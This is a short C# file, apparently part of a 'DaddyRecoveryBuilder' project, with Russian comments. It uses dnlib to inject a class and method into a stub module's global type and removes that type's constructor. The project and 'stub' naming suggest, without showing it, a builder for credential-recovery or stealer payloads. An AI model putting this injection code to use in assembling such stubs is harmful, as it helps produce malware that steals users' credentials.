namespace DaddyRecoveryBuilder.Injectors
{
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using dnlib.DotNet;

    public static class InjectClass
    {
        /// <summary>
        /// Метод для добавления класса в <b>Module Stub'a</b>
        /// </summary>
        /// <param name="module">Имя модуля</param>
        /// <param name="className">Имя класса</param>
        /// <param name="methodName">Имя метода</param>
        /// <returns>Инжектированный метод</returns>
        public static MethodDef InjectMethod(ModuleDef module, Type className, string methodName)
        {
            using var typeModule = ModuleDefMD.Load(className.Module);
            TypeDef typeDef = typeModule.ResolveTypeDef(MDToken.ToRID(className.MetadataToken));
            IEnumerable<IDnlibDef> members = InjectHelper.Inject(typeDef, module.GlobalType, module);
            foreach (MethodDef md in module.GlobalType.Methods.Where(md => md.Name.Equals(".ctor")))
            {
                module.GlobalType.Remove(md);
                break;
            }
            var injectedMethodDef = (MethodDef)members.Single(method => method.Name == methodName);
            return injectedMethodDef;
        }
    }
}